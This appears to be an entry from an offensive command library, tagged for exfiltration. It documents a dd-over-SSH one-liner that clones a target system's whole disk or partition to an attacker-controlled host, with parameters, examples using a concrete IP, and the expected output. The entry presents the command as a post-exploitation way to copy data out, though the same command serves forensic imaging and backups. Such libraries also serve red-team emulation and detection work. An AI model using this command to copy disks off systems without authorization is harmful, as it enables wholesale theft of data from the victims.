---
id: f789edc9-afd1-4a21-8fc4-8e70e587b65d
type: command
executor: bash
data: >-
  dd bs=16m if=/dev/$_SOURCE_DEVICE | ssh root@$_ATTACKER_HOST "dd bs=16M
  of=/dev/$_TARGET_DEVICE"
output: null
created_at: '2023-02-17T02:28:38.395287+00:00'
updated_at: '2023-03-13T19:50:21.945040+00:00'
platforms:
  - Linux
tags:
  - File System
  - Exfiltration
  - Cloning
verified: true
validated: true
---

# dd-clone-linux-partition-over-ssh

## Command

```bash
dd bs=16m if=/dev/$_SOURCE_DEVICE | ssh root@$_ATTACKER_HOST "dd bs=16M of=/dev/$_TARGET_DEVICE"
```

## Description

This command clones an entire Linux partition or disk from a source device (e.g., /dev/sda) on the target system and transfers it over SSH to a target device (e.g., /dev/sdb) on the attacker-controlled host. It is useful in post-exploitation scenarios for forensic imaging, data exfiltration, or creating backups of compromised systems. The block size (bs=16m) optimizes transfer speed for large data volumes. Note the slight case difference in block size notation (16m vs 16M), which is equivalent in most implementations.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `$_SOURCE_DEVICE` | Source block device on the target (e.g., sda for full disk, sda1 for partition) | Yes |
| `$_ATTACKER_HOST` | IP address or hostname of the attacker machine with SSH access | Yes |
| `$_TARGET_DEVICE` | Destination block device on the attacker host (e.g., sdb) | Yes |
| `bs=16m` | Input block size (16 megabytes) for efficient reading | Built-in |
| `bs=16M` | Output block size on remote host | Built-in |
| `root@` | SSH user (assumes root access; adjust for other users) | Built-in |

## Examples

### Basic Usage

```bash
dd bs=16m if=/dev/sda | ssh root@192.168.1.100 "dd bs=16M of=/dev/sdb"
```

Clones /dev/sda to /dev/sdb on the remote host at 192.168.1.100.

### Advanced Usage

```bash
dd bs=4M if=/dev/sda1 status=progress | ssh user@remote.host "dd bs=4M of=backup.img conv=notrunc"
```

Clones a specific partition (/dev/sda1) to a file instead of a device, with progress reporting and no truncation.

## Expected Output

The command outputs progress information during the transfer, such as:

```
16384+0 records in
16384+0 records out
17179869184 bytes (17 GB, 16 GiB) copied, 1234.56 s, 13.9 MB/s
```

Success is indicated by the records in/out matching and no I/O errors. On the remote side, verify with `lsblk` or `fdisk -l /dev/sdb` to confirm the cloned partition structure.

## Related

- [[tools/dd]]
- [[Related Procedure]] (if applicable in context)
